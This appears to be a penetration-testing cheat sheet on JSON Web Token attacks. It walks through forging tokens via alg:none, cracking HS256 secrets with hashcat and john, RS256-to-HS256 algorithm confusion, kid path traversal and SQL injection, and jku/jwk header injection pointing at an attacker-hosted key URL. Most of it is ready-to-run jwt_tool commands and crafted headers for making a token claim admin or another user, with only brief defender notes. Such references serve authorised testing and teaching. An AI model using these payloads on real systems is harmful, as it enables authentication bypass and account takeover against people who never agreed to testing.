# JWT Attacks — JSON Web Tokens

A JWT is `base64url(header).base64url(payload).signature` — a stateless auth token the server
trusts *if the signature verifies*. Attacks target **how the server verifies** (or fails to) so
you can forge a token for any user, flip `role` to `admin`, or skip auth entirely.

Replace placeholders (`<...>`) with your own values.

---
---

# PART 1 — OVERVIEW (at a glance)

## Anatomy

```
eyJhbGciOiJIUzI1NiJ9   .   eyJzdWIiOiJib2IiLCJyb2xlIjoidXNlciJ9   .   <signature>
  ^ header {alg,typ}          ^ payload {sub,role,exp,...}             ^ HMAC or RSA sig
```

## The attacks (try in this order)

| Attack | Server flaw | Result |
|--------|-------------|--------|
| **`alg:none`** | accepts unsigned tokens | strip signature, forge freely |
| **Weak HMAC secret** | HS256 with a guessable key | crack offline → sign anything |
| **alg confusion RS256→HS256** | verifies with the public key, no alg pin | sign with the public key as HMAC secret |
| **`kid` injection** | `kid` used in a file path / SQL | point key lookup at a value you control |
| **`jwk`/`jku` injection** | trusts a key embedded/URL in the header | supply your own signing key |
| **Claim tampering** | signature not actually checked | edit `sub`/`role`, resend |

## The workflow

1. **Decode** the token (jwt.io / `jwt_tool`) — read `alg` and the claims.
2. **Try `alg:none`** and **claim tampering** first (free wins if verification is broken).
3. **Crack** the secret if HS256; try **alg confusion** if RS256.
4. **Header injection** (`kid`/`jku`/`jwk`) if the token references a key.
5. **Forge** the token with the role/user you want and replay it.

## Go-to

```bash
jwt_tool <token>                       # decode + scan for all the above
jwt_tool <token> -X a                  # alg:none exploit
hashcat -m 16500 jwt.txt rockyou.txt   # crack an HS256 secret
```

## Defender notes (for the report)

- **Pin the algorithm** server-side (allowlist), never trust the token's `alg`.
- Reject `none`; use a **strong random secret** (HS) or verify with the **right** key (RS).
- Validate `exp`, `aud`, `iss`; don't resolve `kid`/`jku` to attacker-controlled sources.

---
---

# PART 2 — DETAILED WALKTHROUGH

## Step 1 — Decode & inspect

```bash
jwt_tool eyJhbGciOi...        # prints header + payload, flags likely issues
# or paste into jwt.io / Burp JWT Editor
```

Note the `alg` (HS256 = symmetric secret, RS256 = RSA public/private) and claims like
`sub`, `role`, `isAdmin`, `exp`.

## Step 2 — alg:none (accepts unsigned tokens)

Set `"alg":"none"`, keep your tampered payload, drop the signature (leave the trailing dot):

```
header:  {"alg":"none","typ":"JWT"}
payload: {"sub":"admin","role":"admin"}
token:   base64url(header).base64url(payload).
```

```bash
jwt_tool <token> -X a -pc role -pv admin     # does it for you
```

## Step 3 — Weak HMAC secret (HS256)

If it's HS256, the whole security is one shared secret — crack it offline, then sign anything:

```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# jwt.txt = the full token on one line
# cracked? forge with the secret:
jwt_tool <token> -S hs256 -p '<secret>' -pc role -pv admin
```

```
what you see: <token>:secretkey     ← hashcat prints the recovered secret
```

## Step 4 — alg confusion RS256 → HS256

If the server verifies RS256 but you can get the **public key**, sign a HS256 token using that
public key as the HMAC secret — a naive verifier uses the same key for both:

```bash
# get the public key (from /jwks.json, a cert, or derive from 2 tokens with jwt_tool)
jwt_tool <token> -X k -pk public.pem -pc role -pv admin
```

## Step 5 — Header injection (kid / jku / jwk)

```
kid (key id) used in a file path → traversal to a known-content file you can predict:
   {"alg":"HS256","kid":"../../../../dev/null"}   → sign with empty key ""
kid used in a SQL lookup → SQLi in kid to return a key you control
jku (JWKS URL) → host your own JWKS at a URL the server will fetch, sign with your key:
   {"alg":"RS256","jku":"http://<your-server>/jwks.json"}
jwk (embedded key) → embed your own public key in the header and sign with its private key:
   jwt_tool <token> -X i -pc role -pv admin
```

## Step 6 — Claim tampering (signature not checked)

Some apps decode but never verify. Just edit the payload and resend:

```
{"sub":"admin","role":"admin","isAdmin":true}     # re-base64, keep/adjust sig
```

Also try: extend `exp`, change `sub` to another user (account takeover), flip `role`/`isAdmin`.

---
---

# PART 3 — PAYLOAD ARSENAL

## jwt_tool one-liners

```bash
jwt_tool <token>                         # decode + vuln scan
jwt_tool <token> -X a                     # alg:none
jwt_tool <token> -X k -pk public.pem      # RS256→HS256 confusion
jwt_tool <token> -X i                     # jwk header injection
jwt_tool <token> -C -d rockyou.txt        # dictionary-crack the HS secret
jwt_tool <token> -S hs256 -p 'secret' -pc role -pv admin   # forge with known secret
# -pc = claim to change, -pv = new value
```

## Cracking the secret

```bash
hashcat -m 16500 jwt.txt rockyou.txt      # HS256/384/512 JWT
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
```

## Attack reference

| Header says | Attack |
|-------------|--------|
| `alg:HS256` | crack the secret (hashcat 16500) · try `alg:none` |
| `alg:RS256` | alg confusion (sign HS256 with the public key) · `jku`/`jwk` injection |
| has `kid` | path traversal / SQLi in `kid` → key you control |
| has `jku` | host your own JWKS at `jku` URL |
| any | claim tampering if signature isn't verified |

## Tools

```
jwt_tool      all-in-one exploit/scan
jwt.io        quick decode/encode (don't paste real prod secrets)
Burp JWT Editor / JSON Web Tokens extension   in-flow tampering + attacks
```

---

**Key idea:** a JWT is only as safe as the server's **verification**. The signature is meant to
prove the token wasn't altered — every JWT attack is a way to make the server accept a token you
signed (weak/known secret, wrong algorithm, a key you supplied) or one it never really checked.
Forge the claims you want (`role:admin`, another `sub`) and you have auth bypass or takeover. Fix:
pin the algorithm, verify with the correct key, and reject `none`.
